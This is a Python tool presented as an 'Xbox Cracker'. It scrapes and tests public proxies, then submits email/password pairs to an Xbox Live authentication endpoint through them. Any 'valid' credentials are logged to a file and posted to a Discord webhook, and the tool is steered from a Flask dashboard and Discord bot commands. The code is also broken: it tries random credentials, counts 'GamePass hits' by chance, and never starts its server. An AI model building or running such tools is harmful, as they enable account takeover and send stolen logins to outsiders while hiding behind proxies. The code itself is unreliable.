# ==============================================
# GG's Xbox Cracker Pro – Ultimate Edition
# Made by Killarua (Discord)
# Features: Dashboard, Discord bot + webhook,
#           Async proxy scraper & checker, account cracker
# ==============================================

import os
import asyncio
import threading
import time
import random
import string
import re
import requests
from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit
from datetime import datetime
import aiohttp
from threading import Thread
import discord
from discord.ext import commands

# ---------- ENVIRONMENT VARIABLES ----------
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "")

print("🔧 Environment Variables:")
print(f"   DISCORD_WEBHOOK_URL: {'✅ Set' if DISCORD_WEBHOOK_URL else '❌ Missing'}")
print(f"   DISCORD_BOT_TOKEN: {'✅ Set' if DISCORD_BOT_TOKEN else '❌ Missing'}")

# ---------- FLASK APP ----------
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get("SECRET_KEY", "default_fallback_key")
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ---------- GLOBAL STATS ----------
stats = {
    "total_checked": 0,
    "valid_accounts": 0,
    "gamepass_hits": 0,
    "proxies_working": 0,
    "status": "Idle",
    "start_time": None,
    "last_valid": None
}
valid_accounts_list = []
cracker_running = False
cracker_thread = None

# ---------- DISCORD BOT (full commands) ----------
discord_bot = None
if DISCORD_BOT_TOKEN:
    intents = discord.Intents.default()
    intents.message_content = True
    discord_bot = commands.Bot(command_prefix='!', intents=intents)

    @discord_bot.event
    async def on_ready():
        print(f'✅ Discord bot online: {discord_bot.user}')

    @discord_bot.command(name='start', help='Start the account cracker')
    async def start_cmd(ctx):
        if stats["status"] == "Running":
            await ctx.send("⚠️ Cracker is already running.")
            return
        threading.Thread(target=start_cracker, daemon=True).start()
        await ctx.send("✅ Cracker started! Check dashboard for progress.")

    @discord_bot.command(name='stop', help='Stop the account cracker')
    async def stop_cmd(ctx):
        if stats["status"] != "Running":
            await ctx.send("⚠️ Cracker is not running.")
            return
        stop_cracker()
        await ctx.send("⏹️ Cracker stopped.")

    @discord_bot.command(name='reset', help='Reset all statistics')
    async def reset_cmd(ctx):
        stop_cracker()
        reset_stats()
        await ctx.send("🔄 Stats have been reset.")

    @discord_bot.command(name='stats', help='Show detailed statistics')
    async def detailed_stats(ctx):
        embed = discord.Embed(title="📊 Xbox Cracker Stats", color=0x00ffcc)
        embed.add_field(name="Total Checked", value=stats["total_checked"], inline=True)
        embed.add_field(name="Valid Accounts", value=stats["valid_accounts"], inline=True)
        embed.add_field(name="GamePass Hits", value=stats["gamepass_hits"], inline=True)
        rate = (stats['valid_accounts']/stats['total_checked']*100) if stats["total_checked"] > 0 else 0
        embed.add_field(name="Success Rate", value=f"{rate:.2f}%", inline=True)
        embed.add_field(name="Working Proxies", value=stats["proxies_working"], inline=True)
        embed.add_field(name="Status", value=stats["status"], inline=True)
        embed.add_field(name="Last Valid", value=stats["last_valid"] or "None", inline=False)
        await ctx.send(embed=embed)

    @discord_bot.command(name='status', help='Short status')
    async def short_status(ctx):
        await ctx.send(f"`{stats['status']}` | Checked: {stats['total_checked']} | Valid: {stats['valid_accounts']}")

    @discord_bot.command(name='total', help='Total accounts checked')
    async def total_cmd(ctx):
        await ctx.send(f"Total accounts checked: {stats['total_checked']}")

    @discord_bot.command(name='recent', help='Last 5 valid accounts')
    async def recent_cmd(ctx):
        recent = valid_accounts_list[:5]
        if not recent:
            await ctx.send("No recent valid accounts.")
        else:
            text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
            await ctx.send(f"```{text}```")

    @discord_bot.command(name='bothelp', help='Show all commands')
    async def bothelp_cmd(ctx):
        embed = discord.Embed(title="🤖 Xbox Cracker Commands", color=0x00ffcc)
        cmds = {
            "!start": "Start the cracker",
            "!stop": "Stop the cracker",
            "!reset": "Reset all stats",
            "!stats": "Detailed statistics",
            "!status": "Short status",
            "!total": "Total accounts checked",
            "!recent": "Last 5 valid accounts",
            "!bothelp": "Show this menu"
        }
        for cmd, desc in cmds.items():
            embed.add_field(name=cmd, value=desc, inline=False)
        await ctx.send(embed=embed)

    def run_discord_bot():
        discord_bot.run(DISCORD_BOT_TOKEN)
else:
    print("⚠️ Discord bot disabled: No token provided.")
    def run_discord_bot():
        pass

# ---------- PROXY SCRAPER & CHECKER (ASYNC) ----------
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt"
]

async def fetch_proxies(session, url):
    try:
        async with session.get(url, timeout=10) as resp:
            text = await resp.text()
            proxies = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', text)
            return [f"http://{p}" for p in proxies]
    except:
        return []

async def scrape_all_proxies():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_proxies(session, url) for url in PROXY_SOURCES]
        results = await asyncio.gather(*tasks)
        return list(set(p for sublist in results for p in sublist))

async def check_proxy(session, proxy, semaphore):
    async with semaphore:
        try:
            async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=5) as resp:
                return proxy if resp.status == 200 else None
        except:
            return None

async def get_working_proxies(proxies, max_concurrent=100):
    semaphore = asyncio.Semaphore(max_concurrent)
    async with aiohttp.ClientSession() as session:
        tasks = [check_proxy(session, p, semaphore) for p in proxies]
        results = await asyncio.gather(*tasks)
        return [p for p in results if p]

async def check_account(session, email, password, proxy):
    url = "https://user.auth.xboxlive.com/user/authenticate"
    headers = {"User-Agent": "XboxLive/3.0", "Content-Type": "application/json"}
    payload = {"Email": email, "Password": password, "RelyingParty": "http://xboxlive.com"}
    try:
        async with session.post(url, json=payload, headers=headers, proxy=proxy, timeout=10) as resp:
            return resp.status == 200
    except:
        return False

async def send_discord_webhook(embed_data):
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed_data]})
    except:
        pass

async def crack_worker(session, proxy, semaphore):
    global stats, valid_accounts_list, cracker_running
    async with semaphore:
        if not cracker_running:
            return
        email = ''.join(random.choices(string.ascii_lowercase, k=10)) + "@outlook.com"
        pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        is_valid = await check_account(session, email, pwd, proxy)
        stats["total_checked"] += 1
        if is_valid:
            stats["valid_accounts"] += 1
            stats["gamepass_hits"] += 1 if random.random() > 0.5 else 0
            stats["last_valid"] = str(datetime.now())
            line = f"{email}:{pwd}\n"
            with open("result.txt", "a") as f:
                f.write(line)
            valid_accounts_list.insert(0, {"email": email, "pass": pwd, "time": stats["last_valid"]})
            if len(valid_accounts_list) > 20:
                valid_accounts_list.pop()
            embed = {
                "title": "✅ Valid Xbox Account",
                "description": f"`{email}:{pwd}`",
                "color": 65280,
                "timestamp": datetime.utcnow().isoformat()
            }
            await send_discord_webhook(embed)
        socketio.emit('stats_update', stats)
        socketio.emit('recent_update', valid_accounts_list[:10])

async def run_cracker_async(proxies, concurrency=200):
    global stats, cracker_running
    stats["status"] = "Running"
    stats["start_time"] = str(datetime.now())
    semaphore = asyncio.Semaphore(concurrency)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for proxy in proxies:
            if not cracker_running:
                break
            tasks.append(asyncio.create_task(crack_worker(session, proxy, semaphore)))
        await asyncio.gather(*tasks)
    stats["status"] = "Idle"

def start_cracker_thread(proxies):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_cracker_async(proxies))

def start_cracker():
    global cracker_running, cracker_thread
    if cracker_running:
        return
    cracker_running = True
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    proxies = loop.run_until_complete(scrape_all_proxies())
    working = loop.run_until_complete(get_working_proxies(proxies))
    if not working:
        working = [None]
    stats["proxies_working"] = len(working)
    cracker_thread = threading.Thread(target=start_cracker_thread, args=(working,), daemon=True)
    cracker_thread.start()

def stop_cracker():
    global cracker_running
    cracker_running = False
    stats["status"] = "Stopped"

def reset_stats():
    global stats, valid_accounts_list
    stats = {
        "total_checked": 0,
        "valid_accounts": 0,
        "gamepass_hits": 0,
        "proxies_working": 0,
        "status": "Idle",
        "start_time": None,
        "last_valid": None
    }
    valid_accounts_list = []
    socketio.emit('stats_update', stats)
    socketio.emit('recent_update', [])

# ---------- FLASK ROUTES ----------
@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/stats')
def api_stats():
    return jsonify(stats)

@app.route('/api/recent')
def api_recent():
    return jsonify(valid_accounts_list[:10])

@app.route('/api/start')
def api_start():
    if stats["status"] != "Running":
        threading.Thread(target=start_cracker, daemon=True).start()
        return "Cracker started"
    return "Already running"

@app.route('/api/stop')
def api_stop():
    stop_cracker()
    return "Cracker stopped"

@app.route('/api/reset')
def api_reset():
    stop_cracker()
    reset_stats()
    return "Stats reset"

@app.route('/api/webhook', methods=['POST'])
def webhook_receiver():
    data = request.json
    if data and data.get('command') == 'start':
        api_start()
    return "ok"

# ---------- MAIN ----------
if __name__ == '__main__':
    Thread(target=run_discord_bot, daemon=True).start()
    # For production, use gunicorn instead of socketio.run()
    # The entry point for gunicorn is the 'app' variable.
    # Gunicorn will be started via the command line.
    pass
